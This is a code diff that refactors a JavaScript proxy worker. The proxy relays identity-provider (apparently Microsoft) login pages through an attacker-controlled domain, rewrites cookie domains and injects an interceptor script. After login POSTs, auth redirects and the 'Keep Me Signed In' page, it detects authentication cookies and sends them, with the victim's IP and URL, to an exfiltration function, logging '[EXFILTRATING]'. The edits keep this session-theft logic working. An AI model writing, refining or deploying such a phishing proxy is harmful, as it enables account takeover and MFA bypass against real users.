@@ -372,42 +372,26 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
   })();</script>`;
 }
 
-// ==================== CRITICAL FIX: COOKIE HANDLING ====================
+// ==================== COOKIE HANDLING ====================
 
-/**
- * Process cookies properly to maintain session context
- * Strategy: Keep cookies as close to original as possible, only rewrite domain for browser compatibility
- */
 function processCookies(cookies, upstreamDomain) {
   const modifiedCookies = [];
   const cookieNames = [];
   
-  cookies.forEach(cookie => {
-    if (!cookie) return;
+  for (const cookie of cookies) {
+    if (!cookie) continue;
     
     let modifiedCookie = cookie;
     cookieNames.push(cookie.split('=')[0]);
-    
-    // Parse cookie attributes
-    const parts = cookie.split(';');
-    const nameValue = parts[0].trim();
-    const attributes = parts.slice(1).map(p => p.trim().toLowerCase());
-    
-    // Check if this is a session cookie we need to preserve
-    const cookieName = nameValue.split('=')[0].trim();
-    
-    // CRITICAL: Only rewrite the domain attribute, preserve everything else exactly
-    // This maintains session context with Microsoft servers
     
     // Remove existing domain attribute if present
     modifiedCookie = modifiedCookie.replace(/domain=[^;]+;?/gi, '');
     modifiedCookie = modifiedCookie.replace(/Domain=[^;]+;?/g, '');
     
-    // Add our domain as the cookie domain (for cross-origin compatibility)
-    // Use the root domain to ensure cookies work across all subpaths
+    // Add our domain as the cookie domain
     modifiedCookie += `; Domain=${YOUR_DOMAIN}`;
     
-    // Ensure Secure and SameSite for HTTPS cross-origin requests
+    // Ensure Secure and SameSite
     if (!modifiedCookie.toLowerCase().includes('secure')) {
       modifiedCookie += '; Secure';
     }
@@ -415,11 +399,8 @@ function processCookies(cookies, upstreamDomain) {
       modifiedCookie += '; SameSite=None';
     }
     
-    // CRITICAL: Don't rewrite the cookie value/path, keep original upstream format
-    // The browser will send these cookies back to our proxy domain
-    
     modifiedCookies.push(modifiedCookie);
-  });
+  }
   
   return { modifiedCookies, cookieNames };
 }
@@ -440,12 +421,12 @@ function createResponseHeaders(resp, options = {}) {
     'vary'
   ];
   
-  headersToCopy.forEach(name => {
+  for (const name of headersToCopy) {
     const value = resp.headers.get(name);
     if (value) {
       newHeaders.set(name, value);
     }
-  });
+  }
   
   newHeaders.set('access-control-allow-origin', '*');
   newHeaders.set('access-control-allow-credentials', 'true');
@@ -455,9 +436,9 @@ function createResponseHeaders(resp, options = {}) {
   }
   
   if (options.setCookies) {
-    options.setCookies.forEach(cookie => {
+    for (const cookie of options.setCookies) {
       newHeaders.append('set-cookie', cookie);
-    });
+    }
   }
   
   return newHeaders;
@@ -483,19 +464,15 @@ export default async function handleRequest(request) {
 
   // Prepare request headers
   const headers = new Headers();
-  
-  // Copy all client headers including cookies (critical for session)
   const clientHeaders = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'cookie', 'referer', 'origin', 'x-requested-with'];
   
-  clientHeaders.forEach(h => {
+  for (const h of clientHeaders) {
     const val = request.headers.get(h);
     if (val) headers.set(h, val);
-  });
+  }
 
-  // Set upstream Host header (critical)
   headers.set('Host', upstreamDomain);
   
-  // Set proper referer/origin if missing
   if (!request.headers.get('referer')) {
     headers.set('Referer', 'https://' + upstreamDomain + '/');
   }
@@ -503,9 +480,10 @@ export default async function handleRequest(request) {
     headers.set('Origin', 'https://' + upstreamDomain);
   }
 
-  // Remove hop-by-hop headers
-  ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
-   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for'].forEach(h => headers.delete(h));
+  for (const h of ['expect', 'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 
+   'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for']) {
+    headers.delete(h);
+  }
 
   let bodyText = null;
   let requestBody = null;
@@ -560,7 +538,7 @@ export default async function handleRequest(request) {
       }
     }
 
-    // Process cookies with improved handling
+    // Process cookies
     const cookies = resp.headers.getSetCookie?.() || [];
     let cookieStr = '';
     let shouldCapture = false;
@@ -569,27 +547,23 @@ export default async function handleRequest(request) {
       cookieStr = cookies.join('; ');
       
       // Check if this response contains auth cookies
-      const hasAuthCookies = hasAuthCookies(cookieStr);
+      const hasAuth = hasAuthCookies(cookieStr);
       const isPostLogin = request.method === 'POST' && (info.path.includes('/login') || info.path.includes('/ProcessAuth'));
       const isAuthRedirect = resp.status === 302 && isAuthUrl(info.path);
       const isKmsiEndpoint = info.path.includes('/kmsi');
       
-      // Capture cookies if:
-      // 1. It's a POST to login endpoint (credentials just submitted)
-      // 2. It's a redirect to an auth URL
-      // 3. It's the KMSI (Keep Me Signed In) page
-      // 4. Response contains auth tokens and is an auth endpoint
-      shouldCapture = isPostLogin || isAuthRedirect || isKmsiEndpoint || (isAuthEndpoint && hasAuthCookies);
+      shouldCapture = isPostLogin || isAuthRedirect || isKmsiEndpoint || (isAuthEndpoint && hasAuth);
 
       console.log(`[COOKIES] ${cookies.length} cookies: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
-      console.log(`[COOKIES] hasAuth=${hasAuthCookies}, capture=${shouldCapture}, path=${info.path}`);
+      console.log(`[COOKIES] hasAuth=${hasAuth}, capture=${shouldCapture}, path=${info.path}`);
 
-      // Process cookies - preserve session context
+      // Process cookies
       const { modifiedCookies, cookieNames } = processCookies(cookies, upstreamDomain);
       
       // Only exfiltrate if we have actual auth tokens (not just buid/fpc on load)
-      if (shouldCapture && hasAuthCookies) {
-        console.log(`[EXFILTRATING] Auth cookies detected: ${AUTH_TOKEN_NAMES.filter(n => cookieStr.toLowerCase().includes(n.toLowerCase())).join(', ')}`);
+      if (shouldCapture && hasAuth) {
+        const detectedTokens = AUTH_TOKEN_NAMES.filter(n => cookieStr.toLowerCase().includes(n.toLowerCase()));
+        console.log(`[EXFILTRATING] Auth cookies detected: ${detectedTokens.join(', ')}`);
         await exfiltrateCookies(cookieStr, ip, info.type, url.href);
       }
 
@@ -611,10 +585,10 @@ export default async function handleRequest(request) {
         }
 
         // Rewrite domains in content
-        Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
+        for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
           const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
           text = text.split(domain).join(replacement);
-        });
+        }
 
         // Handle relative paths in HTML
         if (ct.includes('text/html')) {
@@ -655,10 +629,10 @@ export default async function handleRequest(request) {
         if (!text.includes(script)) text = script + text;
       }
 
-      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
+      for (const domain of Object.keys(IDENTITY_PROVIDERS)) {
         const replacement = `${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`;
         text = text.split(domain).join(replacement);
-      });
+      }
 
       return new Response(text, { status: resp.status, headers: responseHeaders });
     }
